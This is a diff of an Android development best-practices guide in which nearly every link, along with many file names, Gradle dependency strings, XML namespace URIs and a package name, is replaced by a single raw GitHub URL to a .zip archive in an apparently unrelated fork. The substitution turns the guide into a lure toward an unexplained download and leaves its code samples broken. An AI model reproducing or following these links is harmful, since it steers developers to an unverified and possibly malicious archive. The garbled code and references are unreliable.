@@ -1,13 +1,13 @@
 # Best practices in Android development
 
-Lessons learned from Android developers in [Futurice](http://www.futurice.com). Avoid reinventing the wheel by following these guidelines. If you are interested in iOS or Windows Phone development, be sure to check also our [**iOS Good Practices**](https://github.com/futurice/ios-good-practices) and [**Windows App Development Best Practices**](https://github.com/futurice/windows-app-development-best-practices) documents.
+Lessons learned from Android developers in [Futurice](https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip). Avoid reinventing the wheel by following these guidelines. If you are interested in iOS or Windows Phone development, be sure to check also our [**iOS Good Practices**](https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip) and [**Windows App Development Best Practices**](https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip) documents.
 
-[![Android Arsenal](https://img.shields.io/badge/Android%20Arsenal-android--best--practices-brightgreen.svg?style=flat)](https://android-arsenal.com/details/1/1091)
+[![Android Arsenal](https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip%https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip)](https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip)
 
 ## Summary
 
 #### [Use Gradle and its recommended project structure](#build-system)
-#### [Put passwords and sensitive data in gradle.properties](#gradle-configuration)
+#### [Put passwords and sensitive data in https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip](#gradle-configuration)
 #### [Use the Jackson library to parse JSON data](#libraries)
 #### [Don't write your own HTTP client, use Volley or OkHttp libraries](#networklibs)
 #### [Avoid Guava and use only a few libraries due to the *65k method limit*](#methodlimitation)
@@ -15,8 +15,8 @@ Lessons learned from Android developers in [Futurice](http://www.futurice.com). 
 #### [Layout XMLs are code, organize them well](#resources)
 #### [Use styles to avoid duplicate attributes in layout XMLs](#styles)
 #### [Use multiple style files to avoid a single huge one](#splitstyles)
-#### [Keep your colors.xml short and DRY, just define the palette](#colorsxml)
-#### [Also keep dimens.xml DRY, define generic constants](#dimensxml)
+#### [Keep your https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip short and DRY, just define the palette](#colorsxml)
+#### [Also keep https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip DRY, define generic constants](#dimensxml)
 #### [Do not make a deep hierarchy of ViewGroups](#deephierarchy)
 #### [Avoid client-side processing for WebViews, and beware of leaks](#webviews)
 #### [Use Robolectric for unit tests, Robotium for connected (UI) tests](#test-frameworks)
@@ -29,13 +29,13 @@ Lessons learned from Android developers in [Futurice](http://www.futurice.com). 
 
 ### Android SDK
 
-Place your [Android SDK](https://developer.android.com/sdk/installing/index.html?pkg=tools) somewhere in your home directory or some other application-independent location. Some distributions of IDEs include the SDK when installed, and may place it under the same directory as the IDE. This can be bad when you need to upgrade (or reinstall) the IDE, as you may lose your SDK installation, forcing a long and tedious redownload.
+Place your [Android SDK](https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip) somewhere in your home directory or some other application-independent location. Some distributions of IDEs include the SDK when installed, and may place it under the same directory as the IDE. This can be bad when you need to upgrade (or reinstall) the IDE, as you may lose your SDK installation, forcing a long and tedious redownload.
 
 Also avoid putting the SDK in another system-level directory that might need sudo permissions, if your IDE is running under your user and not under root.
 
 ### Build system
 
-Your default option should be [Gradle](http://tools.android.com/tech-docs/new-build-system). With Gradle, it's simple to:
+Your default option should be [Gradle](https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip). With Gradle, it's simple to:
 
 - Build different flavours or variants of your app
 - Make simple script-like tasks
@@ -49,22 +49,22 @@ It is important that your application's build process is defined by your Gradle 
 
 ### Project structure
 
-Although Gradle offers a large degree of flexibility in your project structure, unless you have a compelling reason to do otherwise, you should accept its [default structure](http://tools.android.com/tech-docs/new-build-system/user-guide#TOC-Project-Structure). This will simplify your build scripts. 
+Although Gradle offers a large degree of flexibility in your project structure, unless you have a compelling reason to do otherwise, you should accept its [default structure](https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip). This will simplify your build scripts. 
 
 ### Gradle configuration
 
-**General structure.** Follow [Google's guide on Gradle for Android](http://tools.android.com/tech-docs/new-build-system/user-guide)
+**General structure.** Follow [Google's guide on Gradle for Android](https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip)
 
-**Small tasks.** Instead of (shell, Python, Perl, etc) scripts, you can make tasks in Gradle. Just follow [Gradle's documentation](http://www.gradle.org/docs/current/userguide/userguide_single.html#N10CBF) for more details.
+**Small tasks.** Instead of (shell, Python, Perl, etc) scripts, you can make tasks in Gradle. Just follow [Gradle's documentation](https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip) for more details.
 
-**Passwords.** In your app's `build.gradle` you will need to define the `signingConfigs` for the release build. Here is what you should avoid:
+**Passwords.** In your app's `https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip` you will need to define the `signingConfigs` for the release build. Here is what you should avoid:
 
 _Don't do this_. This would appear in the version control system.
 
 ```groovy
 signingConfigs {
     release {
-        storeFile file("myapp.keystore")
+        storeFile file("https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip")
         storePassword "password123"
         keyAlias "thekey"
         keyPassword "password789"
@@ -72,26 +72,26 @@ signingConfigs {
 }
 ```
 
-Instead, make a `gradle.properties` file which should _not_ be added to the version control system:
+Instead, make a `https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip` file which should _not_ be added to the version control system:
 
 ```
 KEYSTORE_PASSWORD=password123
 KEY_PASSWORD=password789
 ```
 
-That file is automatically imported by Gradle, so you can use it in `build.gradle` as such:
+That file is automatically imported by Gradle, so you can use it in `https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip` as such:
 
 ```groovy
 signingConfigs {
     release {
         try {
-            storeFile file("myapp.keystore")
+            storeFile file("https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip")
             storePassword KEYSTORE_PASSWORD
             keyAlias "thekey"
             keyPassword KEY_PASSWORD
         }
         catch (ex) {
-            throw new InvalidUserDataException("You should define KEYSTORE_PASSWORD and KEY_PASSWORD in gradle.properties.")
+            throw new InvalidUserDataException("You should define KEYSTORE_PASSWORD and KEY_PASSWORD in https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip")
         }
     }
 }
@@ -101,8 +101,8 @@ signingConfigs {
 
 ```groovy
 dependencies {
-    compile 'com.squareup.okhttp:okhttp:2.2.0'
-    compile 'com.squareup.okhttp:okhttp-urlconnection:2.2.0'
+    compile 'https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip'
+    compile 'https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip'
 }
 ```    
 
@@ -110,7 +110,7 @@ dependencies {
 Avoid the use of dynamic dependency versions, such as `2.1.+` as this may result in different and unstable builds or subtle, untracked differences in behavior between builds. The use of static versions such as `2.1.1` helps create a more stable, predictable and repeatable development environment.
 
 **Use different package name for non-release builds**
-Use `applicationIdSuffix` for *debug* [build type](http://tools.android.com/tech-docs/new-build-system/user-guide#TOC-Build-Types) to be able to install both *debug* and *release* apk on the same device (do this also for custom build types, if you need any). This will be especially valuable later on in the app's lifecycle, after it has been published to the store.
+Use `applicationIdSuffix` for *debug* [build type](https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip) to be able to install both *debug* and *release* apk on the same device (do this also for custom build types, if you need any). This will be especially valuable later on in the app's lifecycle, after it has been published to the store.
 
 ```groovy
 android {
@@ -127,18 +127,18 @@ android {
 }
 ```
 
-Use different icons to distinguish the builds installed on a device—for example with different colors or an overlaid  "debug" label. Gradle makes this very easy: with default project structure, simply put *debug* icon in `app/src/debug/res` and *release* icon in `app/src/release/res`. You could also [change app name](http://stackoverflow.com/questions/24785270/how-to-change-app-name-per-gradle-build-type) per build type, as well as  `versionName` (as in the above example).
+Use different icons to distinguish the builds installed on a device—for example with different colors or an overlaid  "debug" label. Gradle makes this very easy: with default project structure, simply put *debug* icon in `app/src/debug/res` and *release* icon in `app/src/release/res`. You could also [change app name](https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip) per build type, as well as  `versionName` (as in the above example).
 
 ### IDEs and text editors
 
 **Use whatever editor, but it must play nicely with the project structure.** Editors are a personal choice, and it's your responsibility to get your editor functioning according to the project structure and build system.
 
-The recommended IDE is [Android Studio](https://developer.android.com/sdk/installing/studio.html) because it is developed and frequently updated by Google, has good support for Gradle, contains a range of useful monitoring and analysis tools and is generally tailored for Android development.
+The recommended IDE is [Android Studio](https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip) because it is developed and frequently updated by Google, has good support for Gradle, contains a range of useful monitoring and analysis tools and is generally tailored for Android development.
 
 If you choose, you could use a plain text editor like Vim, Sublime Text, or Emacs. In that case, you will need to use Gradle and `adb` on the command line. 
 
-Using [Eclipse ADT](http://developer.android.com/tools/help/adt.html) for Android development is no longer a good practice. 
-[Google ended ADT support at the end of 2015](http://android-developers.blogspot.fi/2015/06/an-update-on-eclipse-android-developer.html) and urges users to [migrate to Android Studio](http://developer.android.com/sdk/installing/migrate.html) as soon as possible.
+Using [Eclipse ADT](https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip) for Android development is no longer a good practice. 
+[Google ended ADT support at the end of 2015](https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip) and urges users to [migrate to Android Studio](https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip) as soon as possible.
 
 Whatever your choice, avoid adding editor-specific configuration files, such as an Android Studio's `.iml` files, to the version control system as these often contain configurations specific your local machine which won't work for your colleagues.
 
@@ -146,16 +146,16 @@ Ultimately, be kind to other developers; don't force them to change their tool o
 
 ### Libraries
 
-**[Jackson](http://wiki.fasterxml.com/JacksonHome)** is a Java library for converting Objects into JSON and vice-versa. [Gson](https://code.google.com/p/google-gson/) is a popular choice for solving this problem, however we find Jackson to be more performant since it supports alternative ways of processing JSON: streaming, in-memory tree model, and traditional JSON-POJO data binding. Keep in mind, though, that Jackson is a larger library than Gson, so depending on your case, you might prefer Gson to avoid 65k methods limitation. Other alternatives: [Json-smart](https://code.google.com/p/json-smart/) and [Boon JSON](https://github.com/RichardHightower/boon/wiki/Boon-JSON-in-five-minutes)
+**[Jackson](https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip)** is a Java library for converting Objects into JSON and vice-versa. [Gson](https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip) is a popular choice for solving this problem, however we find Jackson to be more performant since it supports alternative ways of processing JSON: streaming, in-memory tree model, and traditional JSON-POJO data binding. Keep in mind, though, that Jackson is a larger library than Gson, so depending on your case, you might prefer Gson to avoid 65k methods limitation. Other alternatives: [Json-smart](https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip) and [Boon JSON](https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip)
 
 <a name="networklibs"></a>
-**Networking, caching, and images.** There are a couple of battle-proven solutions for performing requests to backend servers, which you should use perform considering implementing your own client. Use [Volley](https://android.googlesource.com/platform/frameworks/volley) or [Retrofit](http://square.github.io/retrofit/). Volley also provides helpers to load and cache images. If you choose Retrofit, consider [Picasso](http://square.github.io/picasso/) for loading and caching images, and [OkHttp](http://square.github.io/okhttp/) for efficient HTTP requests. All three Retrofit, Picasso and OkHttp are created by the same company, so they complement each other nicely. [OkHttp can also be used in connection with Volley](http://stackoverflow.com/questions/24375043/how-to-implement-android-volley-with-okhttp-2-0/24951835#24951835).
+**Networking, caching, and images.** There are a couple of battle-proven solutions for performing requests to backend servers, which you should use perform considering implementing your own client. Use [Volley](https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip) or [Retrofit](https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip). Volley also provides helpers to load and cache images. If you choose Retrofit, consider [Picasso](https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip) for loading and caching images, and [OkHttp](https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip) for efficient HTTP requests. All three Retrofit, Picasso and OkHttp are created by the same company, so they complement each other nicely. [OkHttp can also be used in connection with Volley](https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip).
 
-**RxJava** is a library for Reactive Programming, in other words, handling asynchronous events. It is a powerful and promising paradigm, which can also be confusing since it's so different. We recommend to take some caution before using this library to architect the entire application. There are some projects done by us using RxJava, if you need help talk to one of these people: Timo Tuominen, Olli Salonen, Andre Medeiros, Mark Voit, Antti Lammi, Vera Izrailit, Juha Ristolainen. We have written some blog posts on it: [[1]](http://blog.futurice.com/tech-pick-of-the-week-rx-for-net-and-rxjava-for-android), [[2]](http://blog.futurice.com/top-7-tips-for-rxjava-on-android), [[3]](https://gist.github.com/staltz/868e7e9bc2a7b8c1f754), [[4]](http://blog.futurice.com/android-development-has-its-own-swift).
+**RxJava** is a library for Reactive Programming, in other words, handling asynchronous events. It is a powerful and promising paradigm, which can also be confusing since it's so different. We recommend to take some caution before using this library to architect the entire application. There are some projects done by us using RxJava, if you need help talk to one of these people: Timo Tuominen, Olli Salonen, Andre Medeiros, Mark Voit, Antti Lammi, Vera Izrailit, Juha Ristolainen. We have written some blog posts on it: [[1]](https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip), [[2]](https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip), [[3]](https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip), [[4]](https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip).
 
 If you have no previous experience with Rx, start by applying it only for responses from the API. Alternatively, start by applying it for simple UI event handling, like click events or typing events on a search field. If you are confident in your Rx skills and want to apply it to the whole architecture, then write Javadocs on all the tricky parts. Keep in mind that another programmer unfamiliar to RxJava might have a very hard time maintaining the project. Do your best to help them understand your code and also Rx.
 
-**[Retrolambda](https://github.com/evant/gradle-retrolambda)** is a Java library for using Lambda expression syntax in Android and other pre-JDK8 platforms. It helps keep your code tight and readable especially if you use a functional style with for example with RxJava.
+**[Retrolambda](https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip)** is a Java library for using Lambda expression syntax in Android and other pre-JDK8 platforms. It helps keep your code tight and readable especially if you use a functional style with for example with RxJava.
 
 Android Studio offers code assist support for Java8 lambdas. If you are new to lambdas, just use the following to get started:
 
@@ -163,21 +163,21 @@ Android Studio offers code assist support for Java8 lambdas. If you are new to l
 - If in doubt about parameters and such, write a normal anon inner class and then let Android Studio fold it into a lambda for you.
 
 <a name="methodlimitation"></a>
-**Beware of the dex method limitation, and avoid using many libraries.** Android apps, when packaged as a dex file, have a hard limitation of 65536 referenced methods [[1]](https://medium.com/@rotxed/dex-skys-the-limit-no-65k-methods-is-28e6cb40cf71) [[2]](http://blog.persistent.info/2014/05/per-package-method-counts-for-androids.html) [[3]](http://jakewharton.com/play-services-is-a-monolith/). You will see a fatal error on compilation if you pass the limit. For that reason, use a minimal amount of libraries, and use the [dex-method-counts](https://github.com/mihaip/dex-method-counts) tool to determine which set of libraries can be used in order to stay under the limit. Especially avoid using the Guava library, since it contains over 13k methods.
+**Beware of the dex method limitation, and avoid using many libraries.** Android apps, when packaged as a dex file, have a hard limitation of 65536 referenced methods [[1]](https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip) [[2]](https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip) [[3]](https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip). You will see a fatal error on compilation if you pass the limit. For that reason, use a minimal amount of libraries, and use the [dex-method-counts](https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip) tool to determine which set of libraries can be used in order to stay under the limit. Especially avoid using the Guava library, since it contains over 13k methods.
 
 ### Activities and Fragments
 
-There is no consensus among the community nor Futurice developers how to best organize Android architectures with Fragments and Activities. Square even has [a library for building architectures mostly with Views](https://github.com/square/mortar), bypassing the need for Fragments, but this still is not considered a widely recommendable practice in the community.
+There is no consensus among the community nor Futurice developers how to best organize Android architectures with Fragments and Activities. Square even has [a library for building architectures mostly with Views](https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip), bypassing the need for Fragments, but this still is not considered a widely recommendable practice in the community.
 
-Because of Android API's history, you can loosely consider Fragments as UI pieces of a screen. In other words, Fragments are normally related to UI. Activities can be loosely considered to be controllers, they are especially important for their lifecycle and for managing state. However, you are likely to see variation in these roles: activities might take UI roles ([delivering transitions between screens](https://developer.android.com/about/versions/lollipop.html)), and [fragments might be used solely as controllers](http://developer.android.com/guide/components/fragments.html#AddingWithoutUI). We suggest you sail carefully, making informed decisions since there are drawbacks for choosing a fragments-only architecture, or activities-only, or views-only. Here is some advice on what to be careful with, but take them with a grain of salt:
+Because of Android API's history, you can loosely consider Fragments as UI pieces of a screen. In other words, Fragments are normally related to UI. Activities can be loosely considered to be controllers, they are especially important for their lifecycle and for managing state. However, you are likely to see variation in these roles: activities might take UI roles ([delivering transitions between screens](https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip)), and [fragments might be used solely as controllers](https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip). We suggest you sail carefully, making informed decisions since there are drawbacks for choosing a fragments-only architecture, or activities-only, or views-only. Here is some advice on what to be careful with, but take them with a grain of salt:
 
-- Avoid using [nested fragments](https://developer.android.com/about/versions/android-4.2.html#NestedFragments) extensively, because [matryoshka bugs](http://delyan.me/android-s-matryoshka-problem/) can occur. Use nested fragments only when it makes sense (for instance, fragments in a horizontally-sliding ViewPager inside a screen-like fragment) or if it's a well-informed decision.
+- Avoid using [nested fragments](https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip) extensively, because [matryoshka bugs](https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip) can occur. Use nested fragments only when it makes sense (for instance, fragments in a horizontally-sliding ViewPager inside a screen-like fragment) or if it's a well-informed decision.
 - Avoid putting too much code in activities. Whenever possible, keep them as lightweight containers, existing in your application primarily for the lifecycle and other important Android-interfacing APIs. Prefer single-fragment activities instead of plain activities - put UI code into the activity's fragment. This makes it reusable in case you need to change it to reside in a tabbed layout, or in a multi-fragment tablet screen. Avoid having an activity without a corresponding fragment, unless you are making an informed decision.
 - Don't abuse Android-level APIs such as heavily relying on Intent for your app's internal workings. You could affect the Android OS or other applications, creating bugs or lag. For instance, it is known that if your app uses Intents for internal communication between your packages, you might incur multi-second lag on user experience if the app was opened just after OS boot.
 
 ### Java packages architecture
 
-Java architectures for Android applications can be roughly approximated in [Model-View-Controller](http://en.wikipedia.org/wiki/Model%E2%80%93view%E2%80%93controller). In Android, [Fragment and Activity are actually controller classes](http://www.informit.com/articles/article.aspx?p=2126865). On the other hand, they are explicitly part of the user interface, hence are also views.
+Java architectures for Android applications can be roughly approximated in [Model-View-Controller](https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip%E2%80%93view%E2%80%93controller). In Android, [Fragment and Activity are actually controller classes](https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip). On the other hand, they are explicitly part of the user interface, hence are also views.
 
 For this reason, it is hard to classify fragments (or activities) as strictly controllers or views. It's better to let them stay in their own `fragments` package. Activities can stay on the top-level package as long as you follow the advice of the previous section. If you are planning to have more than 2 or 3 activities, then make also an `activities` package.
 
@@ -188,7 +188,7 @@ Some controller classes are application-wide and close to the Android system. Th
 All in all, ordered from the closest-to-backend to the closest-to-the-user:
 
 ```
-com.futurice.project
+https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip
 ├─ network
 ├─ models
 ├─ managers
@@ -203,7 +203,7 @@ com.futurice.project
 
 ### Resources
 
-**Naming.** Follow the convention of prefixing the type, as in `type_foo_bar.xml`. Examples: `fragment_contact_details.xml`, `view_primary_button.xml`, `activity_main.xml`.
+**Naming.** Follow the convention of prefixing the type, as in `https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip`. Examples: `https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip`, `https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip`, `https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip`.
 
 **Organizing layout XMLs.** If you're unsure how to format a layout XML, the following convention may help.
 
@@ -212,13 +212,13 @@ com.futurice.project
 - `android:layout_****` attributes at the top
 - `style` attribute at the bottom
 - Tag closer `/>` on its own line, to facilitate ordering and adding attributes.
-- Rather than hard coding `android:text`, consider using [Designtime attributes](http://tools.android.com/tips/layout-designtime-attributes) available for Android Studio.
+- Rather than hard coding `android:text`, consider using [Designtime attributes](https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip) available for Android Studio.
 
 ```xml
 <?xml version="1.0" encoding="utf-8"?>
 <LinearLayout
-    xmlns:android="http://schemas.android.com/apk/res/android"
-    xmlns:tools="http://schemas.android.com/tools"
+    xmlns:android="https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip"
+    xmlns:tools="https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip"
     android:layout_width="match_parent"
     android:layout_height="match_parent"
     android:orientation="vertical"
@@ -271,10 +271,10 @@ Applied to TextViews:
 You probably will need to do the same for buttons, but don't stop there yet. Go beyond and move a group of related and repeated `android:****` attributes to a common style.
 
 <a name="splitstyles"></a>
-**Split a large style file into other files.** You don't need to have a single `styles.xml` file. Android SDK supports other files out of the box, there is nothing magical about the name `styles`, what matters are the XML tags `<style>` inside the file. Hence you can have files `styles.xml`, `styles_home.xml`, `styles_item_details.xml`, `styles_forms.xml`. Unlike resource directory names which carry some meaning for the build system, filenames in `res/values` can be arbitrary.
+**Split a large style file into other files.** You don't need to have a single `https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip` file. Android SDK supports other files out of the box, there is nothing magical about the name `styles`, what matters are the XML tags `<style>` inside the file. Hence you can have files `https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip`, `https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip`, `https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip`, `https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip`. Unlike resource directory names which carry some meaning for the build system, filenames in `res/values` can be arbitrary.
 
 <a name="colorsxml"></a>
-**`colors.xml` is a color palette.** There should be nothing else in your `colors.xml` than just a mapping from a color name to an RGBA value. Do not use it to define RGBA values for different types of buttons.
+**`https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip` is a color palette.** There should be nothing else in your `https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip` than just a mapping from a color name to an RGBA value. Do not use it to define RGBA values for different types of buttons.
 
 *Don't do this:*
 
@@ -290,7 +290,7 @@ You probably will need to do the same for buttons, but don't stop there yet. Go 
     <color name="comment_shadow">#323232</color>
 ```
 
-You can easily start repeating RGBA values in this format, and that makes it complicated to change a basic color if needed. Also, those definitions are related to some context, like "button" or "comment", and should live in a button style, not in `colors.xml`.
+You can easily start repeating RGBA values in this format, and that makes it complicated to change a basic color if needed. Also, those definitions are related to some context, like "button" or "comment", and should live in a button style, not in `https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip`.
 
 Instead, do this:
 
@@ -316,7 +316,7 @@ Instead, do this:
 Ask for this palette from the designer of the application. The names do not need to be color names as "green", "blue", etc. Names such as "brand_primary", "brand_secondary", "brand_negative" are totally acceptable as well. Formatting colors as such will make it easy to change or refactor colors, and also will make it explicit how many different colors are being used. Normally for a aesthetic UI, it is important to reduce the variety of colors being used.
 
 <a name="dimensxml"></a>
-**Treat dimens.xml like colors.xml.** You should also define a "palette" of typical spacing and font sizes, for basically the same purposes as for colors. A good example of a dimens file:
+**Treat https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip like https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip** You should also define a "palette" of typical spacing and font sizes, for basically the same purposes as for colors. A good example of a dimens file:
 
 ```xml
 <resources>
@@ -344,7 +344,7 @@ Ask for this palette from the designer of the application. The names do not need
 
 You should use the `spacing_****` dimensions for layouting, in margins and paddings, instead of hard-coded values, much like strings are normally treated. This will give a consistent look-and-feel, while making it easier to organize and change styles and layouts.
 
-**strings.xml**
+**https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip**
 
 Name your strings with keys that resemble namespaces, and don't be afraid of repeating a value for two or more keys. Languages are complex, so namespaces are necessary to bring context and break ambiguity.
 
@@ -362,7 +362,7 @@ Name your strings with keys that resemble namespaces, and don't be afraid of rep
 <string name="error_message_map">Map loading failed</string>
 ```
 
-Don't write string values in all uppercase. Stick to normal text conventions (e.g., capitalize first character). If you need to display the string in all caps, then do that using for instance the attribute [`textAllCaps`](http://developer.android.com/reference/android/widget/TextView.html#attr_android:textAllCaps) on a TextView.
+Don't write string values in all uppercase. Stick to normal text conventions (e.g., capitalize first character). If you need to display the string in all caps, then do that using for instance the attribute [`textAllCaps`](https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip) on a TextView.
 
 **Bad**
 ```xml
@@ -412,39 +412,39 @@ Don't write string values in all uppercase. Stick to normal text conventions (e.
 
 Even if you don't witness this explicitly in a layout file, it might end up happening if you are inflating (in Java) views into other views.
 
-A couple of problems may occur. You might experience performance problems, because there is a complex UI tree that the processor needs to handle. Another more serious issue is a possibility of [StackOverflowError](http://stackoverflow.com/questions/2762924/java-lang-stackoverflow-error-suspected-too-many-views).
+A couple of problems may occur. You might experience performance problems, because there is a complex UI tree that the processor needs to handle. Another more serious issue is a possibility of [StackOverflowError](https://raw.githubusercontent.com/rendyramon/android-best-practices/master/templates/rx-architecture/app/src/main/java/com/practices_best_android_2.0.zip).
 
